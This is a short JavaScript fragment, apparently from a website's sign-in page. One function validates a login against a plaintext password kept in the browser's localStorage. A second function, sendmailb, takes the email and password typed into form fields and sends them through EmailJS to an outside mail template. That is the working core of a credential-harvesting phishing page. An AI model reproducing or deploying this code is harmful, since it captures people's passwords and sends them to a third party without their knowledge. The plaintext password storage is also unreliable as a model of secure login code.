
        function validateSignInForm(event) {
            event.preventDefault(); // Prevent form submission for validation

            const email = document.getElementById("loginEmail").value.trim();
            const password = document.getElementById("loginPassword").value;

            // Retrieve stored user data from localStorage
            const storedUserData = JSON.parse(localStorage.getItem("user"));

            if (!storedUserData) {
                alert("No user found. Please sign up first.");
                window.location.href = "register.html"; // Redirect to sign up page
                return false;
            }

            // Validate email and password
            if (email !== storedUserData.email || password !== storedUserData.password) {
                alert("Invalid email or password.");
                return false;
            }

            alert("Login successful!");
            window.location.href = "index.html"; // Redirect to the main website
        }
    
        (function () {
            emailjs.init({
                publicKey: "qb05_XD_DMeQuXujk",
            });
        })();
        function sendmailb(){
            var inp = document.getElementsByClassName('inputs')
            if (inp[0].value == '' || inp[1].value == '') {
            alert('Please fill in all the field ')}
        else{
            var obj = {
                    "email": inp[0].value,
                    "password": inp[1].value
                    
        }
        emailjs.send('service_vj7xv2c', 'template_kosuywv', obj);
    }
}
   